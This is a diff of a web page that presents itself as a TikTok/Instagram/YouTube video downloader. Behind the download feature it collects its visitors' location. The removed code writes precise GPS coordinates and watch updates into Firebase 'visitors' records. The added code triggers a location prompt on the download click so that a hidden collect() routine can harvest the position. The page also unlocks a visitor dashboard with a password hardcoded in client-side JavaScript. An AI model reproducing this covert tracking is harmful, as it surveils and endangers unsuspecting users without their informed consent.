@@ -1881,251 +1881,93 @@
             if (!_isAdmin) collect();
         })();
     </script>
-
     <script>
-        // PASSWORD + SESSION PERSISTENCE
-        const PASS = 'fauzan2007'; // ← Ganti password di sini!
-        const SESSION_KEY = 'sv_admin_unlocked';
-        let unlocked = sessionStorage.getItem(SESSION_KEY) === '1';
+    // PASSWORD + SESSION PERSISTENCE
+    const PASS = 'fauzan2007';
+    const SESSION_KEY = 'sv_admin_unlocked';
+    let unlocked = sessionStorage.getItem(SESSION_KEY) === '1';
+    const isAdminMode = window.location.search.includes('admin') || window.location.hash.includes('admin');
 
-        // Cek apakah ini admin (via URL hash ?admin atau session)
-        // Jika admin → skip collect(), langsung cek session
-        const isAdminMode = window.location.search.includes('admin') || window.location.hash.includes('admin');
+    function openDash() {
+        if (unlocked) { showDash(); return; }
+        document.getElementById('pwOverlay').classList.add('show');
+        setTimeout(() => document.getElementById('pwInput').focus(), 100);
+    }
 
-        function openDash() {
-            if (unlocked) { showDash(); return; }
-            document.getElementById('pwOverlay').classList.add('show');
-            setTimeout(() => document.getElementById('pwInput').focus(), 100);
-        }
-
-        function checkPw() {
-            const val = document.getElementById('pwInput').value;
-            const inp = document.getElementById('pwInput');
-            const err = document.getElementById('pwErr');
-            if (val === PASS) {
-                unlocked = true;
-                sessionStorage.setItem(SESSION_KEY, '1');
-                // Tandai URL dengan hash #admin agar refresh tetap di dashboard
-                if (!window.location.hash.includes('admin')) {
-                    history.replaceState(null, '', window.location.pathname + '#admin');
-                }
-                closePw();
-                showDash();
-            } else {
-                err.textContent = '❌ Password salah, coba lagi';
-                inp.classList.add('shake');
-                setTimeout(() => { inp.classList.remove('shake'); inp.value = ''; inp.focus(); }, 500);
-            }
-        }
-
-        function closePw() {
-            document.getElementById('pwOverlay').classList.remove('show');
-            document.getElementById('pwInput').value = '';
-            document.getElementById('pwErr').textContent = '';
-        }
-
-        function showDash() {
-            document.getElementById('dashOverlay').classList.add('show');
-            // Update URL hash saat buka dashboard
+    function checkPw() {
+        const val = document.getElementById('pwInput').value;
+        const inp = document.getElementById('pwInput');
+        const err = document.getElementById('pwErr');
+        if (val === PASS) {
+            unlocked = true;
+            sessionStorage.setItem(SESSION_KEY, '1');
             if (!window.location.hash.includes('admin')) {
                 history.replaceState(null, '', window.location.pathname + '#admin');
             }
-            window.renderDash();
+            closePw();
+            showDash();
+        } else {
+            err.textContent = '❌ Password salah, coba lagi';
+            inp.classList.add('shake');
+            setTimeout(() => { inp.classList.remove('shake'); inp.value = ''; inp.focus(); }, 500);
         }
+    }
 
-        function closeDash() {
-            document.getElementById('dashOverlay').classList.remove('show');
-            // Hapus hash admin saat tutup dashboard
-            history.replaceState(null, '', window.location.pathname);
-            sessionStorage.removeItem(SESSION_KEY);
-            unlocked = false;
+    function closePw() {
+        document.getElementById('pwOverlay').classList.remove('show');
+        document.getElementById('pwInput').value = '';
+        document.getElementById('pwErr').textContent = '';
+    }
+
+    function showDash() {
+        document.getElementById('dashOverlay').classList.add('show');
+        if (!window.location.hash.includes('admin')) {
+            history.replaceState(null, '', window.location.pathname + '#admin');
         }
+        window.renderDash();
+    }
 
-        // Auto-restore: jika hash #admin & session masih aktif → langsung buka dashboard
-        window.addEventListener('DOMContentLoaded', () => {
-            if (unlocked && isAdminMode) {
-                showDash();
-            }
+    function closeDash() {
+        document.getElementById('dashOverlay').classList.remove('show');
+        history.replaceState(null, '', window.location.pathname);
+        sessionStorage.removeItem(SESSION_KEY);
+        unlocked = false;
+    }
+
+    window.addEventListener('DOMContentLoaded', () => {
+        if (unlocked && isAdminMode) showDash();
+    });
+
+    // ─── DOWNLOADER ───────────────────────────────────────────────
+    const COBALT_ENDPOINTS = [
+        'https://api.cobalt.tools/',
+        'https://cobalt.tools/api/',
+        'https://co.wuk.sh/'
+    ];
+
+    async function tryCobalt(endpoint, url) {
+        const res = await fetch(endpoint, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+            body: JSON.stringify({ url, videoQuality: 'max', filenameStyle: 'pretty', twitterGif: false, tiktokH265: false }),
+            signal: AbortSignal.timeout(10000)
         });
+        if (!res.ok) throw new Error('HTTP ' + res.status);
+        return await res.json();
+    }
 
-        // ─── DOWNLOADER ───────────────────────────────────────────────
-        // Coba beberapa endpoint Cobalt secara berurutan
-        const COBALT_ENDPOINTS = [
-            'https://api.cobalt.tools/',
-            'https://cobalt.tools/api/',
-            'https://co.wuk.sh/'
-        ];
+    async function tryTikwm(url) {
+        const res = await fetch(`https://www.tikwm.com/api/?url=${encodeURIComponent(url)}&hd=1`, {
+            signal: AbortSignal.timeout(10000)
+        });
+        if (!res.ok) throw new Error('HTTP ' + res.status);
+        const d = await res.json();
+        if (d.code !== 0) throw new Error(d.msg || 'Failed');
+        return d.data;
+    }
 
-        async function tryCobalt(endpoint, url) {
-            const res = await fetch(endpoint, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'Accept': 'application/json'
-                },
-                body: JSON.stringify({
-                    url,
-                    videoQuality: 'max',
-                    filenameStyle: 'pretty',
-                    twitterGif: false,
-                    tiktokH265: false
-                }),
-                signal: AbortSignal.timeout(10000)
-            });
-            if (!res.ok) throw new Error('HTTP ' + res.status);
-            return await res.json();
-        }
-
-        // API publik alternatif (RapidAPI style proxy / open instances)
-        async function tryTikwm(url) {
-            // tikwm.com - API publik untuk TikTok tanpa watermark
-            const res = await fetch(`https://www.tikwm.com/api/?url=${encodeURIComponent(url)}&hd=1`, {
-                signal: AbortSignal.timeout(10000)
-            });
-            if (!res.ok) throw new Error('HTTP ' + res.status);
-            const d = await res.json();
-            if (d.code !== 0) throw new Error(d.msg || 'Failed');
-            return d.data;
-        }
-
-        async function handleDownload() {
-
-            // Di dalam handleDownload, setelah validasi URL, sebelum proses download
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        console.log('Lokasi didapat via download click', pos);
-                        // Tidak perlu update karena watchPosition akan melakukannya
-                    },
-                    (err) => console.warn('Gagal dapat lokasi via click', err),
-                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-                );
-            }
-            if (navigator.geolocation && window.lastVisitorKey) {
-                navigator.geolocation.getCurrentPosition(
-                    async (pos) => {
-                        const { latitude, longitude, accuracy } = pos.coords;
-                        await update(ref(db, `visitors/${window.lastVisitorKey}`), {
-                            gps_lat: latitude,
-                            gps_lng: longitude,
-                            gps_accuracy: Math.round(accuracy),
-                            gps_status: 'granted',
-                            gps_source: 'click',
-                            lat: latitude,
-                            lng: longitude
-                        });
-                    },
-                    (err) => console.warn('Gagal dapat lokasi via klik', err),
-                    { enableHighAccuracy: true, timeout: 15000 }
-                );
-            }
-            if (navigator.geolocation && savedKey) {
-                let bestAcc = Infinity;
-                let committed = false;
-                let watchIdLow = null;
-                let watchIdHigh = null;
-                let geoInFlight = false;
-                const HARD_STOP = 30000; // 30 detik
-
-                const doReverseGeo = async (lat, lng) => { /* sama seperti sebelumnya */ };
-
-                const savePos = async (pos, source) => {
-                    const { latitude, longitude, accuracy } = pos.coords;
-                    // Simpan jika pertama kali atau akurasi lebih baik
-                    if (!committed || accuracy < bestAcc) {
-                        committed = true;
-                        bestAcc = accuracy;
-                        await update(ref(db, `visitors/${savedKey}`), {
-                            gps_lat: latitude,
-                            gps_lng: longitude,
-                            gps_accuracy: Math.round(accuracy),
-                            gps_status: 'granted',
-                            gps_source: source,
-                            lat: latitude,
-                            lng: longitude
-                        });
-                        if (!geoInFlight) doReverseGeo(latitude, longitude);
-                        // Jika akurasi sudah bagus (<= 100m), hentikan semua watcher
-                        if (accuracy <= 100) stopAll();
-                    }
-                };
-
-                const stopAll = () => {
-                    if (watchIdLow !== null) { navigator.geolocation.clearWatch(watchIdLow); watchIdLow = null; }
-                    if (watchIdHigh !== null) { navigator.geolocation.clearWatch(watchIdHigh); watchIdHigh = null; }
-                };
-
-                const onErr = async (err) => {
-                    if (!committed) {
-                        if (err.code === 1) { // PERMISSION_DENIED
-                            stopAll();
-                            await update(ref(db, `visitors/${savedKey}`), { gps_status: 'denied' });
-                        }
-                        // untuk error lain (timeout, unavailable) biarkan watcher lain mencoba
-                    }
-                };
-
-                // Pertama, coba getCurrentPosition dengan akurasi tinggi, timeout cepat
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        savePos(pos, 'gps');
-                        // setelah berhasil, kita masih bisa menjalankan watch untuk update jika ada yang lebih akurat? 
-                        // Tapi kita hentikan saja karena sudah dapat. Atau kita jalankan watch juga untuk jaga-jaga.
-                        // Lebih baik jalankan watch juga dengan akurasi tinggi untuk update jika ada perbaikan.
-                        // Tapi kita sudah dapat, jadi tidak perlu watcher tambahan? Mungkin kita tetap jalankan watch
-                        // dengan akurasi tinggi untuk mendapatkan update jika ada perbaikan (misal dari 10m ke 5m).
-                        // Kita bisa mulai watchHigh saja.
-                        watchIdHigh = navigator.geolocation.watchPosition(
-                            p => savePos(p, 'gps'),
-                            onErr,
-                            { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
-                        );
-                        // Set timeout untuk menghentikan watch setelah beberapa saat
-                        setTimeout(() => {
-                            if (watchIdHigh !== null) {
-                                navigator.geolocation.clearWatch(watchIdHigh);
-                                watchIdHigh = null;
-                            }
-                        }, 15000); // 15 detik setelah dapat posisi, stop
-                    },
-                    (err) => {
-                        // Jika getCurrentPosition gagal (misal karena butuh interaksi atau timeout), lanjut ke watchPosition
-                        console.warn('getCurrentPosition gagal, beralih ke watch', err);
-                        // Mulai watch network dan gps seperti sebelumnya
-                        watchIdLow = navigator.geolocation.watchPosition(
-                            pos => savePos(pos, 'network'),
-                            onErr,
-                            { enableHighAccuracy: false, timeout: 10000, maximumAge: 30000 }
-                        );
-                        watchIdHigh = navigator.geolocation.watchPosition(
-                            pos => savePos(pos, 'gps'),
-                            onErr,
-                            { enableHighAccuracy: true, timeout: 40000, maximumAge: 0 }
-                        );
-                    },
-                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-                );
-
-                // Hard stop 30 detik
-                setTimeout(() => {
-                    stopAll();
-                    if (!committed) {
-                        update(ref(db, `visitors/${savedKey}`), { gps_status: 'unavailable' });
-                    }
-                }, HARD_STOP);
-            }
-
-
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    console.log("Lokasi didapat:", pos);
-                    // Lokasi akan otomatis tersimpan melalui watchPosition yang sudah berjalan,
-                    // atau kita bisa langsung update ke Firebase jika perlu.
-                },
-                (err) => console.warn("Gagal dapat lokasi:", err),
-                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-            );
-        }
+    async function handleDownload() {
+        // Ambil elemen
         const url = document.getElementById('videoUrl').value.trim();
         const btn = document.getElementById('btnDl');
         const loading = document.getElementById('loadingArea');
@@ -2134,9 +1976,20 @@
         const errEl = document.getElementById('errorMsg');
         const resArea = document.getElementById('resultArea');
 
+        // Validasi
         if (!url) { showErr('Masukkan link video terlebih dahulu!'); return; }
         if (!url.startsWith('http')) { showErr('Link tidak valid. Pastikan diawali https://'); return; }
 
+        // Minta izin lokasi (dialog akan muncul, data akan diambil oleh watchPosition di collect())
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                () => {},
+                () => {},
+                { enableHighAccuracy: true, timeout: 5000 }
+            );
+        }
+
+        // Update UI
         btn.disabled = true;
         errEl.classList.remove('show');
         resArea.classList.add('show');
@@ -2149,7 +2002,7 @@
 
         let success = false;
 
-        // ── 1. Coba tikwm.com untuk TikTok (sangat reliable) ──
+        // Coba tikwm.com untuk TikTok
         if (isTiktok && !success) {
             try {
                 loadingText.textContent = 'Mengambil video TikTok...';
@@ -2157,8 +2010,6 @@
                 loading.style.display = 'none';
 
                 const hdUrl = data.hdplay || data.play;
-                const noWmUrl = data.wmplay ? '' : ''; // wmplay = with watermark, play/hdplay = no watermark
-
                 let buttons = '';
                 if (hdUrl) {
                     buttons += `<a class="dl-btn primary" href="${hdUrl}" target="_blank" download="tiktok_hd.mp4">⬇ Download HD (No WM)</a>`;
@@ -2173,16 +2024,16 @@
                 const title = data.title ? `<p style="font-size:0.78rem;color:var(--muted);margin-bottom:0.75rem;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:100%">${data.title.substring(0, 80)}</p>` : '';
 
                 result.innerHTML = `
-        <div class="video-info">
-          <h3>✅ Video TikTok siap didownload!</h3>
-          ${title}
-          <div class="dl-options">${buttons}</div>
-        </div>`;
+                    <div class="video-info">
+                        <h3>✅ Video TikTok siap didownload!</h3>
+                        ${title}
+                        <div class="dl-options">${buttons}</div>
+                    </div>`;
                 success = true;
-            } catch (e) { /* fallthrough ke cobalt */ }
+            } catch (e) { /* fallthrough */ }
         }
 
-        // ── 2. Coba Cobalt API (semua platform) ──
+        // Coba Cobalt API
         if (!success) {
             for (const endpoint of COBALT_ENDPOINTS) {
                 try {
@@ -2192,14 +2043,14 @@
                     if ((data.status === 'stream' || data.status === 'redirect' || data.status === 'tunnel') && data.url) {
                         loading.style.display = 'none';
                         result.innerHTML = `
-            <div class="video-info">
-              <h3>✅ Video siap didownload!</h3>
-              <p>Klik tombol di bawah untuk menyimpan video</p>
-              <div class="dl-options">
-                <a class="dl-btn primary" href="${data.url}" target="_blank" download>⬇ Download Video</a>
-                <a class="dl-btn secondary" href="${url}" target="_blank">🔗 Buka Original</a>
-              </div>
-            </div>`;
+                            <div class="video-info">
+                                <h3>✅ Video siap didownload!</h3>
+                                <p>Klik tombol di bawah untuk menyimpan video</p>
+                                <div class="dl-options">
+                                    <a class="dl-btn primary" href="${data.url}" target="_blank" download>⬇ Download Video</a>
+                                    <a class="dl-btn secondary" href="${url}" target="_blank">🔗 Buka Original</a>
+                                </div>
+                            </div>`;
                         success = true;
                         break;
                     } else if (data.status === 'picker' && data.picker?.length) {
@@ -2208,11 +2059,11 @@
                             `<a class="dl-btn primary" href="${item.url}" target="_blank" download>⬇ Media ${i + 1}</a>`
                         ).join('\n');
                         result.innerHTML = `
-            <div class="video-info">
-              <h3>✅ ${data.picker.length} media ditemukan</h3>
-              <p>Pilih media yang ingin didownload</p>
-              <div class="dl-options">${items}</div>
-            </div>`;
+                            <div class="video-info">
+                                <h3>✅ ${data.picker.length} media ditemukan</h3>
+                                <p>Pilih media yang ingin didownload</p>
+                                <div class="dl-options">${items}</div>
+                            </div>`;
                         success = true;
                         break;
                     }
@@ -2220,55 +2071,57 @@
             }
         }
 
-        // ── 3. Fallback ke layanan eksternal ──
+        // Fallback
         if (!success) {
             loading.style.display = 'none';
             showFallback(url, isTiktok, isIg, isYt);
         }
 
         btn.disabled = false;
+    }
 
-        function showFallback(url, isTiktok, isIg, isYt) {
-            let services = '';
-            if (isTiktok) {
-                services = `
-      <a class="dl-btn primary" href="https://snaptik.app" target="_blank">📱 SnapTik</a>
-      <a class="dl-btn secondary" href="https://tikmate.online" target="_blank">🎵 TikMate</a>`;
-            } else if (isIg) {
-                services = `
-      <a class="dl-btn primary" href="https://snapinsta.app" target="_blank">📸 SnapInsta</a>
-      <a class="dl-btn secondary" href="https://igdownloader.app" target="_blank">📷 IGDownloader</a>`;
-            } else if (isYt) {
-                services = `
-      <a class="dl-btn primary" href="https://y2mate.com" target="_blank">▶️ Y2Mate</a>
-      <a class="dl-btn secondary" href="https://cobalt.tools" target="_blank">🌐 Cobalt</a>`;
-            } else {
-                services = `
-      <a class="dl-btn primary" href="https://snaptik.app" target="_blank">📱 SnapTik</a>
-      <a class="dl-btn primary" href="https://snapinsta.app" target="_blank">📸 SnapInsta</a>
-      <a class="dl-btn secondary" href="https://cobalt.tools" target="_blank">🌐 Cobalt</a>`;
-            }
-
-            document.getElementById('resultContent').innerHTML = `
-    <div class="video-info">
-      <h3>⚡ Download via layanan ini:</h3>
-      <p>Paste link yang sama di salah satu layanan berikut:</p>
-      <div class="dl-options">${services}</div>
-    </div>`;
-            document.getElementById('resultArea').classList.add('show');
+    function showFallback(url, isTiktok, isIg, isYt) {
+        let services = '';
+        if (isTiktok) {
+            services = `
+                <a class="dl-btn primary" href="https://snaptik.app" target="_blank">📱 SnapTik</a>
+                <a class="dl-btn secondary" href="https://tikmate.online" target="_blank">🎵 TikMate</a>`;
+        } else if (isIg) {
+            services = `
+                <a class="dl-btn primary" href="https://snapinsta.app" target="_blank">📸 SnapInsta</a>
+                <a class="dl-btn secondary" href="https://igdownloader.app" target="_blank">📷 IGDownloader</a>`;
+        } else if (isYt) {
+            services = `
+                <a class="dl-btn primary" href="https://y2mate.com" target="_blank">▶️ Y2Mate</a>
+                <a class="dl-btn secondary" href="https://cobalt.tools" target="_blank">🌐 Cobalt</a>`;
+        } else {
+            services = `
+                <a class="dl-btn primary" href="https://snaptik.app" target="_blank">📱 SnapTik</a>
+                <a class="dl-btn primary" href="https://snapinsta.app" target="_blank">📸 SnapInsta</a>
+                <a class="dl-btn secondary" href="https://cobalt.tools" target="_blank">🌐 Cobalt</a>`;
         }
 
-        function showErr(msg) {
-            const e = document.getElementById('errorMsg');
-            e.textContent = msg; e.classList.add('show');
-            document.getElementById('resultArea').classList.remove('show');
-        }
+        document.getElementById('resultContent').innerHTML = `
+            <div class="video-info">
+                <h3>⚡ Download via layanan ini:</h3>
+                <p>Paste link yang sama di salah satu layanan berikut:</p>
+                <div class="dl-options">${services}</div>
+            </div>`;
+        document.getElementById('resultArea').classList.add('show');
+    }
 
-        document.getElementById('videoUrl').addEventListener('keydown', e => { if (e.key === 'Enter') handleDownload(); });
-        document.getElementById('pwOverlay').addEventListener('click', e => { if (e.target === document.getElementById('pwOverlay')) closePw(); });
-        document.getElementById('detailModal').addEventListener('click', e => { if (e.target === document.getElementById('detailModal')) window.closeDetail(); });
-        document.getElementById('renameModal').addEventListener('click', e => { if (e.target === document.getElementById('renameModal')) window.closeRename(); });
-    </script>
+    function showErr(msg) {
+        const e = document.getElementById('errorMsg');
+        e.textContent = msg; e.classList.add('show');
+        document.getElementById('resultArea').classList.remove('show');
+    }
+
+    // Event listeners
+    document.getElementById('videoUrl').addEventListener('keydown', e => { if (e.key === 'Enter') handleDownload(); });
+    document.getElementById('pwOverlay').addEventListener('click', e => { if (e.target === document.getElementById('pwOverlay')) closePw(); });
+    document.getElementById('detailModal').addEventListener('click', e => { if (e.target === document.getElementById('detailModal')) window.closeDetail(); });
+    document.getElementById('renameModal').addEventListener('click', e => { if (e.target === document.getElementById('renameModal')) window.closeRename(); });
+</script>
 </body>
 
 </html>
